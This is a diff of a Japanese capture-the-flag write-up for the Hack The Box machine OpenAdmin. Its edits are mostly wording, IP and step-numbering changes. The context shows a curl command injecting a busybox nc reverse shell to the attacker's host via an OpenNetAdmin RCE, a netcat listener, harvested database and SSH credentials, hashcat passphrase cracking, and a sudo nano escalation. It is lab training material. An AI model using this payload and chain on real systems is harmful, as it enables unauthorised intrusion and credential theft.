@@ -16,10 +16,9 @@ I scanned ports so fast, even my computer was surprised.
 [~] The config file is expected to be at "/home/kali/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
-Open 10.129.170.23:22
-Open 10.129.170.23:80
-10.129.170.23 -> [22,80]
-
+Open 10.129.5.45:22
+Open 10.129.5.45:80
+10.129.5.45 -> [22,80]
 ```
 
 
@@ -67,7 +66,7 @@ OpenNetAdminというやつが使われているっぽい
 
 ## STEP 3
 opennetadmin 18.1.1 には CVE-2019-25065 が存在しRCEの脆弱性がある  
-searchsploitで、PoCを発見
+searchsploitでPoCを発見
 ```sh
 └─$ searchsploit -m 47691
   Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
@@ -111,8 +110,8 @@ PoCのcurlをぱくって、RCE
 └─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";busybox nc 10.10.14.70 4444 -e /bin/bash;echo \"END\"&xajaxargs[]=ping" http://10.129.5.45/ona/login.php 
 ^C
 ```
-無事リバースシェル取得  
-ユーザフラグすら権限拒否
+リバースシェル取得  
+がユーザフラグすら権限拒否
 ```sh
 └─$ rlwrap nc -lnvp 4444  
 listening on [any] 4444 ...
@@ -128,11 +127,6 @@ not a tty
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@openadmin:/opt/ona/www$
-
-
-www-data@openadmin:/opt/ona/www$ tty
-tty
-/dev/pts/1
 
 
 www-data@openadmin:/opt/ona/www$ id
@@ -155,7 +149,7 @@ www-data@openadmin:/opt/ona$ ls /var/www/html
 ls /var/www/html
 artwork  index.html  marga  music  ona  sierra
 ```
-他にもinternalフォルダがあるが、jimmyユーザ以外は確認できない
+他にもinternalフォルダがあるが、jimmyユーザ・internalグループ以外は確認できない
 ```sh
 www-data@openadmin:/opt/ona$ ls -l /var/www/
 ls -l /var/www/
@@ -165,7 +159,7 @@ drwxrwx--- 2 jimmy    internal 4096 Nov 23  2019 internal
 lrwxrwxrwx 1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
 ```
 STEP2のonaのサイトを見たところ、dbとの接続がありそうなかんじ  
-ona配下のディレクトリを探索するとdbのクレデンシャルを発見
+ona配下のディレクトリを探索するとdbのパスワードを発見
 ```sh
 www-data@openadmin:/opt/ona/www$ cat /var/www/html/ona/local/config/database_settings.inc.php
 <www/html/ona/local/config/database_settings.inc.php
@@ -197,6 +191,7 @@ $ona_contexts=array (
 www-data@openadmin:/opt/ona$ su jimmy
 su jimmy
 Password: n1nj4W4rri0R!
+
 
 jimmy@openadmin:/opt/ona$ id
 id
@@ -234,7 +229,7 @@ AssignUserID joanna joanna
 ```
 sshローカルポートフォワーディングで、kaliの52846番ポートとターゲットの52846番ポートを結ぶ
 ```sh
-└─$ ssh jimmy@10.129.246.252 -L 52846:localhost:52846
+└─$ ssh -L 52846:localhost:52846 jimmy@10.129.246.252
 The authenticity of host '10.129.246.252 (10.129.246.252)' can't be established.
 ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
 This key is not known by any other names.
@@ -268,7 +263,9 @@ jimmy@openadmin:~$
 ```
 52846番ポートアクセス成功  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_03.png" width="50%" height="50%">  
-ログインページが表示された  
+
+
+## STEP 5
 ログインページのソース、index.phpを確認
 ```php
 jimmy@openadmin:~$ cat /var/www/internal/index.php
@@ -409,19 +406,22 @@ echo "<pre>$output</pre>";
 Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
 ```
-sha512のハッシュ値をクラックすることができた、パスワードは Revealed  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_04.png" width="75%" height="75%">  
-秘密鍵ゲット～  
+sha512のハッシュ値をクラックすることができた、web上での jimmy のパスワードは Revealed  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_04.png" width="75%" height="75%">
+
+
+## STEP 6
+ログイン成功、joannnaの秘密鍵ゲット～  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_05.png" width="50%" height="50%">  
 秘密鍵でsshログインしようとしたが、パスフレーズがいるもよう
 ```
 └─$ chmod 0600 id_rsa 
                                                                                                                                                                                                                                             
-┌──(kali㉿kali)-[~]
+
 └─$ ssh -i id_rsa joanna@10.129.246.252
 Enter passphrase for key 'id_rsa':
 ```
-`ssh2john`でパスフレーズのハッシュを抽出し、`hashcat`でクラック
+`ssh2john`でパスフレーズのハッシュを抽出し、`hashcat`でクラック  
 パスフレーズは bloodninjas と判明
 ```sh
 └─$ ssh2john id_rsa 
@@ -488,7 +488,7 @@ Hardware.Mon.#1..: Util: 62%
 Started: Thu Jun  5 00:02:18 2025
 Stopped: Thu Jun  5 00:02:33 2025
 ```
-`openssl`で秘密鍵のパスフレーズを解除してsshログイン成功！
+`openssl`でパスフレーズを解除した秘密鍵でsshログイン成功！  
 ユーザフラグゲット！ルートフラグは権限拒否
 ```sh
 └─$ openssl rsa -in id_rsa -out id_rsa_joanna
@@ -531,7 +531,7 @@ ls: cannot open directory '/root': Permission denied
 ```
 
 
-## STEP 5
+## STEP 7
 `/bin/nano /opt/priv`がパスワードなしで実行できる
 ```sh
 joanna@openadmin:~$ sudo -l
